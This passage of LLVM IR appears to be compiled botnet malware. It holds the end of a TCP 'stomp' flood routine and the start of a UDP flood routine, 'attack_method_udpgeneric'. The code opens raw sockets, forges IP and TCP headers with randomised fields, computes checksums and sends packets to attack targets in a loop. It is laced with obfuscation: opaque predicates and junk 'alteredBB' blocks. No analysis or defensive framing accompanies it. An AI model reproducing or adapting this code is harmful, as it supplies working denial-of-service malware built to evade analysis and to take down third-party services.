  %474 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = and i16 %476, -4097
  %478 = or i16 %477, 4096
  store i16 %478, i16* %475, align 4
  %479 = call i32 @rand_next()
  %480 = and i32 %479, 65535
  %481 = trunc i32 %480 to i16
  %482 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 5
  store i16 %481, i16* %483, align 2
  %484 = load i8, i8* %26, align 1
  %485 = sext i8 %484 to i16
  %486 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 4
  %488 = load i16, i16* %487, align 4
  %489 = and i16 %485, 1
  %490 = shl i16 %489, 13
  %491 = and i16 %488, -8193
  %492 = or i16 %491, %490
  store i16 %492, i16* %487, align 4
  %493 = load i8, i8* %27, align 1
  %494 = sext i8 %493 to i16
  %495 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %496 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %495, i32 0, i32 4
  %497 = load i16, i16* %496, align 4
  %498 = and i16 %494, 1
  %499 = shl i16 %498, 12
  %500 = and i16 %497, -4097
  %501 = or i16 %500, %499
  store i16 %501, i16* %496, align 4
  %502 = load i8, i8* %28, align 1
  %503 = sext i8 %502 to i16
  %504 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 4
  %506 = load i16, i16* %505, align 4
  %507 = and i16 %503, 1
  %508 = shl i16 %507, 11
  %509 = and i16 %506, -2049
  %510 = or i16 %509, %508
  store i16 %510, i16* %505, align 4
  %511 = load i8, i8* %29, align 1
  %512 = sext i8 %511 to i16
  %513 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 4
  %515 = load i16, i16* %514, align 4
  %516 = and i16 %512, 1
  %517 = shl i16 %516, 10
  %518 = and i16 %515, -1025
  %519 = or i16 %518, %517
  store i16 %519, i16* %514, align 4
  %520 = load i8, i8* %30, align 1
  %521 = sext i8 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 4
  %524 = load i16, i16* %523, align 4
  %525 = and i16 %521, 1
  %526 = shl i16 %525, 9
  %527 = and i16 %524, -513
  %528 = or i16 %527, %526
  store i16 %528, i16* %523, align 4
  %529 = load i8, i8* %31, align 1
  %530 = sext i8 %529 to i16
  %531 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 4
  %533 = load i16, i16* %532, align 4
  %534 = and i16 %530, 1
  %535 = shl i16 %534, 8
  %536 = and i16 %533, -257
  %537 = or i16 %536, %535
  store i16 %537, i16* %532, align 4
  %538 = load i8*, i8** %46, align 8
  %539 = load i32, i32* %32, align 4
  call void @rand_str(i8* %538, i32 %539)
  br label %587

; <label>:540:                                    ; preds = %315, %307
  %541 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %542 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %541, i32 0, i32 4
  %543 = load i16, i16* %542, align 4
  %544 = lshr i16 %543, 8
  %545 = and i16 %544, 1
  %546 = zext i16 %545 to i32
  %547 = icmp ne i32 %546, 0
  br i1 %547, label %556, label %548

; <label>:548:                                    ; preds = %540
  %549 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 4
  %551 = load i16, i16* %550, align 4
  %552 = lshr i16 %551, 10
  %553 = and i16 %552, 1
  %554 = zext i16 %553 to i32
  %555 = icmp ne i32 %554, 0
  br i1 %555, label %556, label %559

; <label>:556:                                    ; preds = %548, %540
  %557 = load i32, i32* %34, align 4
  %558 = call i32 @close(i32 %557)
  br label %169

; <label>:559:                                    ; preds = %548
  br label %560

; <label>:560:                                    ; preds = %559
  br label %561

; <label>:561:                                    ; preds = %560, %295
  br label %562

; <label>:562:                                    ; preds = %561, %291, %283
  %563 = load i32, i32* @x.31
  %564 = load i32, i32* @y.32
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %562
  %571 = call i64 @time(i64* null) #6
  %572 = load i64, i64* %39, align 8
  %573 = sub nsw i64 %571, %572
  %574 = icmp sgt i64 %573, 10
  %575 = load i32, i32* @x.31
  %576 = load i32, i32* @y.32
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBBpart234, label %originalBB25alteredBB

originalBBpart234:                                ; preds = %originalBB25
  br i1 %574, label %583, label %586

; <label>:583:                                    ; preds = %originalBBpart234
  %584 = load i32, i32* %34, align 4
  %585 = call i32 @close(i32 %584)
  br label %169

; <label>:586:                                    ; preds = %originalBBpart234
  br label %271

; <label>:587:                                    ; preds = %418
  br label %588

; <label>:588:                                    ; preds = %587, %originalBBpart212
  %589 = load i32, i32* @x.31
  %590 = load i32, i32* @y.32
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %588
  %597 = load i32, i32* %17, align 4
  %598 = add nsw i32 %597, 1
  store i32 %598, i32* %17, align 4
  %599 = load i32, i32* @x.31
  %600 = load i32, i32* @y.32
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBBpart253, label %originalBB36alteredBB

originalBBpart253:                                ; preds = %originalBB36
  br label %163

; <label>:607:                                    ; preds = %163
  br label %608

; <label>:608:                                    ; preds = %originalBBpart265, %607
  store i32 0, i32* %17, align 4
  br label %609

; <label>:609:                                    ; preds = %originalBBpart261, %608
  %610 = load i32, i32* %17, align 4
  %611 = load i8, i8* %13, align 1
  %612 = zext i8 %611 to i32
  %613 = icmp slt i32 %610, %612
  br i1 %613, label %614, label %750

; <label>:614:                                    ; preds = %609
  %615 = load i32, i32* @x.31
  %616 = load i32, i32* @y.32
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %614
  %623 = load i8**, i8*** %20, align 8
  %624 = load i32, i32* %17, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds i8*, i8** %623, i64 %625
  %627 = load i8*, i8** %626, align 8
  store i8* %627, i8** %47, align 8
  %628 = load i8*, i8** %47, align 8
  %629 = bitcast i8* %628 to %struct.iphdr*
  store %struct.iphdr* %629, %struct.iphdr** %48, align 8
  %630 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %631 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %630, i64 1
  %632 = bitcast %struct.iphdr* %631 to %struct.tcphdr*
  store %struct.tcphdr* %632, %struct.tcphdr** %49, align 8
  %633 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %634 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %633, i64 1
  %635 = bitcast %struct.tcphdr* %634 to i8*
  store i8* %635, i8** %50, align 8
  %636 = load i16, i16* %22, align 2
  %637 = zext i16 %636 to i32
  %638 = icmp eq i32 %637, 65535
  %639 = load i32, i32* @x.31
  %640 = load i32, i32* @y.32
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %638, label %647, label %653

; <label>:647:                                    ; preds = %originalBBpart257
  %648 = call i32 @rand_next()
  %649 = and i32 %648, 65535
  %650 = trunc i32 %649 to i16
  %651 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %652 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %651, i32 0, i32 3
  store i16 %650, i16* %652, align 4
  br label %653

; <label>:653:                                    ; preds = %647, %originalBBpart257
  %654 = load i8, i8* %33, align 1
  %655 = icmp ne i8 %654, 0
  br i1 %655, label %656, label %659

; <label>:656:                                    ; preds = %653
  %657 = load i8*, i8** %50, align 8
  %658 = load i32, i32* %32, align 4
  call void @rand_str(i8* %657, i32 %658)
  br label %659

; <label>:659:                                    ; preds = %656, %653
  %660 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %661 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %660, i32 0, i32 7
  store i16 0, i16* %661, align 2
  %662 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %663 = bitcast %struct.iphdr* %662 to i16*
  %664 = call zeroext i16 @checksum_generic(i16* %663, i32 20)
  %665 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %666 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %665, i32 0, i32 7
  store i16 %664, i16* %666, align 2
  %667 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %668 = load i32, i32* %17, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %667, i64 %669
  %671 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %670, i32 0, i32 1
  %672 = load i32, i32* %671, align 4
  %673 = add i32 %672, 1
  store i32 %673, i32* %671, align 4
  %674 = trunc i32 %672 to i16
  %675 = call zeroext i16 @htons(i16 zeroext %674) #7
  %676 = zext i16 %675 to i32
  %677 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %678 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %677, i32 0, i32 2
  store i32 %676, i32* %678, align 4
  %679 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %680 = load i32, i32* %17, align 4
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %679, i64 %681
  %683 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %682, i32 0, i32 2
  %684 = load i32, i32* %683, align 4
  %685 = trunc i32 %684 to i16
  %686 = call zeroext i16 @htons(i16 zeroext %685) #7
  %687 = zext i16 %686 to i32
  %688 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %689 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %688, i32 0, i32 3
  store i32 %687, i32* %689, align 4
  %690 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %691 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %690, i32 0, i32 6
  store i16 0, i16* %691, align 4
  %692 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %693 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %694 = bitcast %struct.tcphdr* %693 to i8*
  %695 = load i32, i32* %32, align 4
  %696 = sext i32 %695 to i64
  %697 = add i64 20, %696
  %698 = trunc i64 %697 to i16
  %699 = call zeroext i16 @htons(i16 zeroext %698) #7
  %700 = load i32, i32* %32, align 4
  %701 = sext i32 %700 to i64
  %702 = add i64 20, %701
  %703 = trunc i64 %702 to i32
  %704 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %692, i8* %694, i16 zeroext %699, i32 %703)
  %705 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i32 0, i32 6
  store i16 %704, i16* %706, align 4
  %707 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %708 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %707, i32 0, i32 1
  %709 = load i16, i16* %708, align 2
  %710 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %711 = load i32, i32* %17, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %710, i64 %712
  %714 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %713, i32 0, i32 0
  %715 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %714, i32 0, i32 1
  store i16 %709, i16* %715, align 2
  %716 = load i32, i32* %18, align 4
  %717 = load i8*, i8** %47, align 8
  %718 = load i32, i32* %32, align 4
  %719 = sext i32 %718 to i64
  %720 = add i64 40, %719
  %721 = bitcast %union.__CONST_SOCKADDR_ARG* %51 to %struct.sockaddr**
  %722 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %723 = load i32, i32* %17, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %722, i64 %724
  %726 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %725, i32 0, i32 0
  %727 = bitcast %struct.sockaddr_in* %726 to %struct.sockaddr*
  store %struct.sockaddr* %727, %struct.sockaddr** %721, align 8
  %728 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %51, i32 0, i32 0
  %729 = load %struct.sockaddr*, %struct.sockaddr** %728, align 8
  %730 = call i64 @sendto(i32 %716, i8* %717, i64 %720, i32 16384, %struct.sockaddr* %729, i32 16)
  br label %731

; <label>:731:                                    ; preds = %659
  %732 = load i32, i32* @x.31
  %733 = load i32, i32* @y.32
  %734 = sub i32 %732, 1
  %735 = mul i32 %732, %734
  %736 = urem i32 %735, 2
  %737 = icmp eq i32 %736, 0
  %738 = icmp slt i32 %733, 10
  %739 = or i1 %737, %738
  br i1 %739, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %731
  %740 = load i32, i32* %17, align 4
  %741 = add nsw i32 %740, 1
  store i32 %741, i32* %17, align 4
  %742 = load i32, i32* @x.31
  %743 = load i32, i32* @y.32
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %609

; <label>:750:                                    ; preds = %609
  %751 = load i32, i32* @x.31
  %752 = load i32, i32* @y.32
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %750
  %759 = load i32, i32* @x.31
  %760 = load i32, i32* @y.32
  %761 = sub i32 %759, 1
  %762 = mul i32 %759, %761
  %763 = urem i32 %762, 2
  %764 = icmp eq i32 %763, 0
  %765 = icmp slt i32 %760, 10
  %766 = or i1 %764, %765
  br i1 %766, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %608

; <label>:767:                                    ; preds = %282, %143, %originalBBpart24
  %768 = load i32, i32* @x.31
  %769 = load i32, i32* @y.32
  %770 = sub i32 %768, 1
  %771 = mul i32 %768, %770
  %772 = urem i32 %771, 2
  %773 = icmp eq i32 %772, 0
  %774 = icmp slt i32 %769, 10
  %775 = or i1 %773, %774
  br i1 %775, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %767
  %776 = load i32, i32* @x.31
  %777 = load i32, i32* @y.32
  %778 = sub i32 %776, 1
  %779 = mul i32 %776, %778
  %780 = urem i32 %779, 2
  %781 = icmp eq i32 %780, 0
  %782 = icmp slt i32 %777, 10
  %783 = or i1 %781, %782
  br i1 %783, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %784 = alloca i8, align 1
  %785 = alloca %struct.attack_target*, align 8
  %786 = alloca i8, align 1
  %787 = alloca %struct.attack_option*, align 8
  %788 = alloca i32, align 4
  %789 = alloca i32, align 4
  %790 = alloca %struct.attack_stomp_data*, align 8
  %791 = alloca i8**, align 8
  %792 = alloca i8, align 1
  %793 = alloca i16, align 2
  %794 = alloca i8, align 1
  %795 = alloca i8, align 1
  %796 = alloca i16, align 2
  %797 = alloca i8, align 1
  %798 = alloca i8, align 1
  %799 = alloca i8, align 1
  %800 = alloca i8, align 1
  %801 = alloca i8, align 1
  %802 = alloca i8, align 1
  %803 = alloca i32, align 4
  %804 = alloca i8, align 1
  %805 = alloca i32, align 4
  %806 = alloca %struct.sockaddr_in, align 4
  %807 = alloca %struct.sockaddr_in, align 4
  %808 = alloca i32, align 4
  %809 = alloca [256 x i8], align 16
  %810 = alloca i64, align 8
  %811 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %812 = alloca i32, align 4
  %813 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %814 = alloca %struct.tcphdr*, align 8
  %815 = alloca %struct.iphdr*, align 8
  %816 = alloca %struct.tcphdr*, align 8
  %817 = alloca i8*, align 8
  %818 = alloca i8*, align 8
  %819 = alloca %struct.iphdr*, align 8
  %820 = alloca %struct.tcphdr*, align 8
  %821 = alloca i8*, align 8
  %822 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %784, align 1
  store %struct.attack_target* %1, %struct.attack_target** %785, align 8
  store i8 %2, i8* %786, align 1
  store %struct.attack_option* %3, %struct.attack_option** %787, align 8
  %823 = load i8, i8* %784, align 1
  %824 = zext i8 %823 to i64
  %825 = call noalias i8* @calloc(i64 %824, i64 16) #6
  %826 = bitcast i8* %825 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %826, %struct.attack_stomp_data** %790, align 8
  %827 = load i8, i8* %784, align 1
  %828 = zext i8 %827 to i64
  %829 = call noalias i8* @calloc(i64 %828, i64 8) #6
  %830 = bitcast i8* %829 to i8**
  store i8** %830, i8*** %791, align 8
  %831 = load i8, i8* %786, align 1
  %832 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %833 = call i32 @attack_get_opt_int(i8 zeroext %831, %struct.attack_option* %832, i8 zeroext 2, i32 0)
  %834 = trunc i32 %833 to i8
  store i8 %834, i8* %792, align 1
  %835 = load i8, i8* %786, align 1
  %836 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %837 = call i32 @attack_get_opt_int(i8 zeroext %835, %struct.attack_option* %836, i8 zeroext 3, i32 65535)
  %838 = trunc i32 %837 to i16
  store i16 %838, i16* %793, align 2
  %839 = load i8, i8* %786, align 1
  %840 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %841 = call i32 @attack_get_opt_int(i8 zeroext %839, %struct.attack_option* %840, i8 zeroext 4, i32 64)
  %842 = trunc i32 %841 to i8
  store i8 %842, i8* %794, align 1
  %843 = load i8, i8* %786, align 1
  %844 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %845 = call i32 @attack_get_opt_int(i8 zeroext %843, %struct.attack_option* %844, i8 zeroext 5, i32 1)
  %846 = trunc i32 %845 to i8
  store i8 %846, i8* %795, align 1
  %847 = load i8, i8* %786, align 1
  %848 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %849 = call i32 @attack_get_opt_int(i8 zeroext %847, %struct.attack_option* %848, i8 zeroext 7, i32 65535)
  %850 = trunc i32 %849 to i16
  store i16 %850, i16* %796, align 2
  %851 = load i8, i8* %786, align 1
  %852 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %853 = call i32 @attack_get_opt_int(i8 zeroext %851, %struct.attack_option* %852, i8 zeroext 11, i32 1)
  %854 = trunc i32 %853 to i8
  store i8 %854, i8* %797, align 1
  %855 = load i8, i8* %786, align 1
  %856 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %857 = call i32 @attack_get_opt_int(i8 zeroext %855, %struct.attack_option* %856, i8 zeroext 12, i32 1)
  %858 = trunc i32 %857 to i8
  store i8 %858, i8* %798, align 1
  %859 = load i8, i8* %786, align 1
  %860 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %861 = call i32 @attack_get_opt_int(i8 zeroext %859, %struct.attack_option* %860, i8 zeroext 13, i32 1)
  %862 = trunc i32 %861 to i8
  store i8 %862, i8* %799, align 1
  %863 = load i8, i8* %786, align 1
  %864 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %865 = call i32 @attack_get_opt_int(i8 zeroext %863, %struct.attack_option* %864, i8 zeroext 14, i32 1)
  %866 = trunc i32 %865 to i8
  store i8 %866, i8* %800, align 1
  %867 = load i8, i8* %786, align 1
  %868 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %869 = call i32 @attack_get_opt_int(i8 zeroext %867, %struct.attack_option* %868, i8 zeroext 15, i32 1)
  %870 = trunc i32 %869 to i8
  store i8 %870, i8* %801, align 1
  %871 = load i8, i8* %786, align 1
  %872 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %873 = call i32 @attack_get_opt_int(i8 zeroext %871, %struct.attack_option* %872, i8 zeroext 16, i32 1)
  %874 = trunc i32 %873 to i8
  store i8 %874, i8* %802, align 1
  %875 = load i8, i8* %786, align 1
  %876 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %877 = call i32 @attack_get_opt_int(i8 zeroext %875, %struct.attack_option* %876, i8 zeroext 0, i32 768)
  store i32 %877, i32* %803, align 4
  %878 = load i8, i8* %786, align 1
  %879 = load %struct.attack_option*, %struct.attack_option** %787, align 8
  %880 = call i32 @attack_get_opt_int(i8 zeroext %878, %struct.attack_option* %879, i8 zeroext 1, i32 1)
  %881 = trunc i32 %880 to i8
  store i8 %881, i8* %804, align 1
  %882 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %882, i32* %789, align 4
  %883 = icmp eq i32 %882, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %121
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %146
  store i32 0, i32* %17, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %172
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %189
  %884 = load i32, i32* %34, align 4
  %885 = load i32, i32* %34, align 4
  %886 = call i32 (i32, i32, ...) @fcntl(i32 %885, i32 3, i32 0)
  %_ = sub i32 0, %886
  %gen = add i32 %_, 2048
  %_15 = sub i32 0, %886
  %gen16 = add i32 %_15, 2048
  %_17 = sub i32 0, %886
  %gen18 = add i32 %_17, 2048
  %_19 = shl i32 %886, 2048
  %_20 = sub i32 %886, 2048
  %gen21 = mul i32 %_20, 2048
  %887 = or i32 %886, 2048
  %888 = call i32 (i32, i32, ...) @fcntl(i32 %884, i32 4, i32 %887)
  %889 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 0
  store i16 2, i16* %889, align 4
  %890 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %891 = load i32, i32* %17, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %890, i64 %892
  %894 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %893, i32 0, i32 2
  %895 = load i8, i8* %894, align 4
  %896 = zext i8 %895 to i32
  %897 = icmp slt i32 %896, 32
  br label %originalBB14

originalBB25alteredBB:                            ; preds = %originalBB25, %562
  %898 = call i64 @time(i64* null) #6
  %899 = load i64, i64* %39, align 8
  %_26 = sub i64 0, %898
  %gen27 = add i64 %_26, %899
  %_28 = sub i64 %898, %899
  %gen29 = mul i64 %_28, %899
  %_30 = sub i64 0, %898
  %gen31 = add i64 %_30, %899
  %_32 = shl i64 %898, %899
  %900 = sub nsw i64 %898, %899
  %901 = icmp sgt i64 %900, 10
  br label %originalBB25

originalBB36alteredBB:                            ; preds = %originalBB36, %588
  %902 = load i32, i32* %17, align 4
  %_37 = shl i32 %902, 1
  %_38 = sub i32 0, %902
  %gen39 = add i32 %_38, 1
  %_40 = sub i32 0, %902
  %gen41 = add i32 %_40, 1
  %_42 = sub i32 %902, 1
  %gen43 = mul i32 %_42, 1
  %_44 = sub i32 0, %902
  %gen45 = add i32 %_44, 1
  %_46 = shl i32 %902, 1
  %_47 = shl i32 %902, 1
  %_48 = sub i32 0, %902
  %gen49 = add i32 %_48, 1
  %_50 = sub i32 %902, 1
  %gen51 = mul i32 %_50, 1
  %903 = add nsw i32 %902, 1
  store i32 %903, i32* %17, align 4
  br label %originalBB36

originalBB55alteredBB:                            ; preds = %originalBB55, %614
  %904 = load i8**, i8*** %20, align 8
  %905 = load i32, i32* %17, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds i8*, i8** %904, i64 %906
  %908 = load i8*, i8** %907, align 8
  store i8* %908, i8** %47, align 8
  %909 = load i8*, i8** %47, align 8
  %910 = bitcast i8* %909 to %struct.iphdr*
  store %struct.iphdr* %910, %struct.iphdr** %48, align 8
  %911 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %912 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %911, i64 1
  %913 = bitcast %struct.iphdr* %912 to %struct.tcphdr*
  store %struct.tcphdr* %913, %struct.tcphdr** %49, align 8
  %914 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %915 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %914, i64 1
  %916 = bitcast %struct.tcphdr* %915 to i8*
  store i8* %916, i8** %50, align 8
  %917 = load i16, i16* %22, align 2
  %918 = zext i16 %917 to i32
  %919 = icmp eq i32 %918, 65535
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %731
  %920 = load i32, i32* %17, align 4
  %921 = add nsw i32 %920, 1
  store i32 %921, i32* %17, align 4
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %750
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %767
  br label %originalBB67
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
